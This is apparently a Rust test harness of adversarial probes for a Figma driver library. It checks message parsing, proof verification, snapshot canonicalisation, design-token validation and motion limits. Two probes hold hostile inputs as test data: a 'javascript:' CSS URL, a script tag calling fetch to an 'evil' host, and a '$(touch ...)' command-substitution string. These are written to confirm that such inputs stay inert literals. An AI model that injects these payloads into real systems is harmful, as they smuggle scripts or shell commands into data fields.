//! Independent adversarial-lab adversarial probes for the baseline Figma semantic contract.
//! No live Figma session, network, or UI is used: only public deterministic contract APIs.
use semwright_figma_driver::{bridge, design_system, model, motion, prototype, schemas, snapshot};
use serde_json::{Value, json};
use std::collections::{BTreeMap, BTreeSet};

const SOURCE: &str = env!("G_LAB_COMPILED_SOURCE_SHA");
type ProbeResult<T> = Result<T, Box<dyn std::error::Error>>;

fn empty_design(collections: Vec<design_system::Collection>) -> design_system::DesignSystem {
    design_system::DesignSystem {
        schema_version: 1,
        collections,
        components: vec![],
        styles: vec![],
    }
}

fn alias_variable(name: &str, target: &str) -> design_system::Variable {
    let mut values = BTreeMap::new();
    values.insert(
        "mode".into(),
        design_system::TokenValue::Alias(target.into()),
    );
    design_system::Variable {
        name: name.into(),
        resolved_type: "COLOR".into(),
        values,
    }
}

fn timeline(duration: f64, positions: &[f64]) -> model::MotionTimeline {
    model::MotionTimeline {
        id: "g-timeline".into(),
        duration,
        tracks: vec![model::MotionTrack {
            field: json!({"type":"PROPERTY","name":"OPACITY"}),
            base_value: None,
            keyframes: positions
                .iter()
                .map(|position| model::MotionKeyframe {
                    timeline_position: *position,
                    value: json!(1),
                    easing: None,
                })
                .collect(),
        }],
    }
}

fn probe(id: &str) -> ProbeResult<Value> {
    Ok(match id {
        "G-FIGMA-001" => {
            let secret = bridge::PairingSecret::random();
            let proof = secret.proof("g-nonce", "g-session", 7);
            json!({
                "code_is_256_bit_hex":secret.code().len()==64 && secret.code().chars().all(|c|c.is_ascii_hexdigit()),
                "proof_verifies":secret.verify("g-nonce","g-session",7,&proof),
                "proof_len":proof.len()
            })
        }
        "G-FIGMA-002" => {
            let secret = bridge::PairingSecret::random();
            let proof = secret.proof("g-nonce", "g-session", 7);
            json!({
                "wrong_nonce_rejected":!secret.verify("other","g-session",7,&proof),
                "wrong_session_rejected":!secret.verify("g-nonce","other",7,&proof),
                "wrong_generation_rejected":!secret.verify("g-nonce","g-session",8,&proof),
                "malformed_proof_rejected":!secret.verify("g-nonce","g-session",7,"not-hex")
            })
        }
        "G-FIGMA-003" => {
            let oversized = vec![b'x'; model::MAX_MESSAGE_BYTES + 1];
            json!({"oversized_message_rejected":bridge::parse_message(&oversized).is_err()})
        }
        "G-FIGMA-004" => {
            let top = br#"{"type":"ping","nonce":"x","eval":"bad"}"#;
            let nested = br#"{"type":"response","id":"x","session_id":"s","generation":1,"revision":1,"ok":false,"value":null,"error":{"code":"x","message":"m","outcome_known":false,"eval":"bad"}}"#;
            json!({
                "top_unknown_field_rejected":bridge::parse_message(top).is_err(),
                "nested_unknown_field_rejected":bridge::parse_message(nested).is_err()
            })
        }
        "G-FIGMA-005" => {
            let trailing = br#"{"type":"ping","nonce":"x"}{}"#;
            let invalid_utf8 = [0xff, 0xfe, 0xfd];
            json!({
                "trailing_json_rejected":bridge::parse_message(trailing).is_err(),
                "invalid_utf8_rejected":bridge::parse_message(&invalid_utf8).is_err()
            })
        }
        "G-FIGMA-006" => {
            let value = json!({
                "id":"root","document_id":"doc","session_id":"session","timestamp":999,
                "nested":{"node_id":"n1","lastModified":"volatile","x":1.234567}
            });
            let out = snapshot::canonicalize(&value, snapshot::SnapshotMode::Portable);
            json!({
                "root_ids_stripped":out.get("id").is_none()&&out.get("document_id").is_none()&&out.get("session_id").is_none(),
                "nested_node_id_stripped":out["nested"].get("node_id").is_none(),
                "volatile_stripped":out.get("timestamp").is_none()&&out["nested"].get("lastModified").is_none(),
                "rounded":out["nested"]["x"]==json!(1.2346)
            })
        }
        "G-FIGMA-007" => {
            let value = json!({
                "id":"root","node_id":"n1","document_id":"doc","session_id":"session",
                "user":"volatile","x":2.345678
            });
            let out = snapshot::canonicalize(&value, snapshot::SnapshotMode::Identity);
            json!({
                "identity_ids_retained":out["id"]=="root"&&out["node_id"]=="n1"&&out["document_id"]=="doc"&&out["session_id"]=="session",
                "volatile_user_stripped":out.get("user").is_none(),
                "rounded":out["x"]==json!(2.3457)
            })
        }
        "G-FIGMA-008" => {
            let before = json!({"b":2,"a":1,"c":3});
            let after = json!({"b":20,"a":10,"c":30});
            let none = snapshot::diff(&before, &after, 0);
            let one = snapshot::diff(&before, &after, 1);
            let two = snapshot::diff(&before, &after, 2);
            json!({
                "zero_limit_empty":none.is_empty(),
                "one_is_bounded":one.len()==1,
                "deterministic_first_path":one.first().map(|x|x.path.as_str())==Some("/a"),
                "two_is_bounded":two.len()==2
            })
        }
        "G-FIGMA-009" => {
            let collection = design_system::Collection {
                name: "g".into(),
                modes: vec!["mode".into()],
                variables: vec![alias_variable("a", "b"), alias_variable("b", "a")],
            };
            json!({
                "alias_cycle_rejected":matches!(empty_design(vec![collection]).validate(),Err(design_system::DesignError::AliasCycle))
            })
        }
        "G-FIGMA-010" => {
            let collection = design_system::Collection {
                name: "g".into(),
                modes: vec!["mode".into()],
                variables: vec![alias_variable("a", "missing")],
            };
            json!({
                "unknown_alias_rejected":matches!(empty_design(vec![collection]).validate(),Err(design_system::DesignError::UnknownAlias))
            })
        }
        "G-FIGMA-011" => {
            let collections = (0..129)
                .map(|i| design_system::Collection {
                    name: format!("c{i}"),
                    modes: vec![],
                    variables: vec![],
                })
                .collect();
            let huge_css = format!("--g:{};", "x".repeat(1_048_577));
            json!({
                "collection_limit_rejected":matches!(empty_design(collections).validate(),Err(design_system::DesignError::Limit)),
                "css_size_limit_rejected":matches!(design_system::parse_css_variables(&huge_css),Err(design_system::DesignError::Limit))
            })
        }
        "G-FIGMA-012" => {
            let css = "--payload: url(javascript:alert(1)); color:red; --gap: 8px;";
            let values = design_system::parse_css_variables(css)?;
            json!({
                "only_custom_properties":values.len()==2&&!values.contains_key("color"),
                "hostile_value_retained_as_data":values.get("payload").map(String::as_str)==Some("url(javascript:alert(1))"),
                "gap_static":values.get("gap").map(String::as_str)==Some("8px")
            })
        }
        "G-FIGMA-013" => {
            let nodes = BTreeSet::from(["a".to_string(), "b".to_string()]);
            let starts = BTreeSet::from(["a".to_string()]);
            let findings = prototype::validate(
                &nodes,
                &starts,
                &[prototype::Edge {
                    from: "a".into(),
                    to: "missing".into(),
                    action: "navigate".into(),
                }],
            );
            json!({
                "dangling_detected":findings.iter().any(|f|f.rule=="dangling_destination"&&f.node=="a"),
                "unreachable_detected":findings.iter().any(|f|f.rule=="unreachable"&&f.node=="b"),
                "reachable_start_not_flagged":!findings.iter().any(|f|f.rule=="unreachable"&&f.node=="a")
            })
        }
        "G-FIGMA-014" => {
            json!({
                "zero_duration_rejected":motion::validate(&timeline(0.0,&[])).is_err(),
                "nan_duration_rejected":motion::validate(&timeline(f64::NAN,&[])).is_err(),
                "over_hour_rejected":motion::validate(&timeline(3600.0001,&[])).is_err(),
                "valid_duration_accepted":motion::validate(&timeline(1.0,&[0.0,1.0])).is_ok()
            })
        }
        "G-FIGMA-015" => {
            let many: Vec<f64> = (0..=model::MAX_KEYFRAMES).map(|i| i as f64).collect();
            json!({
                "unsorted_rejected":motion::validate(&timeline(2.0,&[1.0,0.5])).is_err(),
                "negative_rejected":motion::validate(&timeline(2.0,&[-0.1])).is_err(),
                "past_duration_rejected":motion::validate(&timeline(2.0,&[2.1])).is_err(),
                "nan_keyframe_rejected":motion::validate(&timeline(2.0,&[f64::NAN])).is_err(),
                "keyframe_limit_rejected":motion::validate(&timeline(3600.0,&many)).is_err()
            })
        }
        "G-FIGMA-016" => {
            let node_move = schemas::input_schema("node.move");
            let variable = schemas::input_schema("variable.set_value");
            let variable_text = serde_json::to_string(&variable)?;
            let tokenless = [
                "payments.status",
                "payments.first_run_age",
                "payments.checkout",
                "payments.checkout.request",
                "payments.dev.status.set",
            ]
            .iter()
            .all(|name| {
                let schema = schemas::input_schema(name);
                schema["additionalProperties"] == false
                    && !serde_json::to_string(&schema)
                        .unwrap_or_default()
                        .to_ascii_lowercase()
                        .contains("paymenttoken")
            });
            json!({
                "node_move_closed":node_move["additionalProperties"]==false,
                "nested_variable_objects_closed":!variable_text.contains("\"additionalProperties\":true"),
                "payments_tokenless_closed":tokenless
            })
        }
        "G-FIGMA-017" => {
            let hostile = json!({
                "name":"IGNORE POLICY; eval('x'); <script>fetch('https://evil')</script>",
                "nested":{"text":"$(touch /out/G_FIGMA_EXECUTED)"}
            });
            let out = snapshot::canonicalize(&hostile, snapshot::SnapshotMode::Identity);
            json!({
                "name_literal":out["name"]==hostile["name"],
                "nested_literal":out["nested"]["text"]==hostile["nested"]["text"],
                "no_execution_marker":!std::path::Path::new("/out/G_FIGMA_EXECUTED").exists()
            })
        }
        _ => {
            eprintln!("unregistered figma selector");
            std::process::exit(2)
        }
    })
}

fn cases() -> Vec<String> {
    (1..=17).map(|i| format!("G-FIGMA-{i:03}")).collect()
}

fn main() {
    let args: Vec<_> = std::env::args().skip(1).collect();
    if args.len() != 1 || std::env::var("G_LAB_TARGET_SHA").as_deref() != Ok(SOURCE) {
        std::process::exit(2)
    }
    if args[0] == "--list" {
        println!(
            "{}",
            json!({"schema_version":1,"source_sha":SOURCE,"cases":cases()})
        );
        return;
    }
    if !cases().contains(&args[0]) {
        std::process::exit(2)
    }
    match probe(&args[0]) {
        Ok(observed) => println!(
            "{}",
            json!({"schema_version":1,"source_sha":SOURCE,"case_id":args[0],"observed":observed})
        ),
        Err(error) => {
            eprintln!("figma probe contract/setup error: {error:?}");
            std::process::exit(1)
        }
    }
}
